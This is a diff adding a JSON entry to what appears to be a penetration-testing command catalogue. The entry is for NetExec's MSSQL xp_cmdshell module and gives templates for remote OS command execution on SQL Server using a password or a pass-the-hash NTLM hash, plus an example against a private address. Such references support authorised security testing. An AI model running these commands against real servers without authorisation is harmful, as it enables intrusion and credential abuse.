@@ -1,0 +1,30 @@
+{
+  "id": "nxc-mssql-xpcmdshell",
+  "name": "NetExec MSSQL xp_cmdshell",
+  "command": "nxc mssql '<ip>' -u '<user>' -p '<password>' -x 'whoami' -M xp_cmdshell",
+  "description": "Execute OS commands via MSSQL xp_cmdshell using NetExec",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "mssql"
+  ],
+  "tags": [
+    "nxc",
+    "mssql",
+    "xp_cmdshell",
+    "execution",
+    "rce"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc mssql '<ip>' -u '<user>' -H '<hash>' -x 'whoami' -M xp_cmdshell"
+    }
+  ],
+  "examples": [
+    "nxc mssql '192.168.1.100' -u 'sa' -p 'password' -x 'whoami' -M xp_cmdshell"
+  ]
+}
